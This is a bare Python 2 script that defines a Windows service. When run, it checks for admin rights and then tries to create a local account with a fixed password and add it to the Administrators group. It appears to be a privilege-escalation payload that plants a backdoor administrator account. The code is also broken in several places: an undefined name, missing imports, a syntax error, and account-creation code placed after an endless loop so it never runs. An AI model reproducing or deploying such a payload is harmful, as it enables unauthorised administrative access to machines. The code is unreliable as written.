import servicemanager
import win32serviceutil
import win32service
import win32api
import os
import ctypes

if __name__ == '__main__':
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandlerCommandLine(service)

class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = 'ServiceName'
    _svc_display_name_ = 'ServiceDisplayName'

    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)

    def sleep(self, sec):
        win32api.Sleep(sec*1000, True)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.start()
        except Exception, x:
            self.SvcStop()

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

    def start(self):
        self.runflag = True
        f = open('C:/Users/user/Desktop/priv.txt', 'w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            f.write('[-] We are Not admin!')
        else:
            f.write('[+] We are admin!')
        f.close()
        while self.runflag:
            self.sleep(10)
        
        USER = "User"
        GROUP = "Administrators"
        user_info = dict(
                name = USER,
                password = 'PASS'
                priv = win32netcon.USER_PRIV_USER,
                home_dir = None,
                comment = None,
                flags = win32netcon.UF_SCRIPT,
                script_path = None
                )
        user_group_info = dict(
                domainandname = USER
                )
        try:
            win32net.NetUserAdd(None, 1, user_info)
            win32net.NetLocalGroupAddMembers(None, GROUP, 3, [user_group_info])
        except Exception, x:
            pass

    def stop(self):
        self.runflag = False
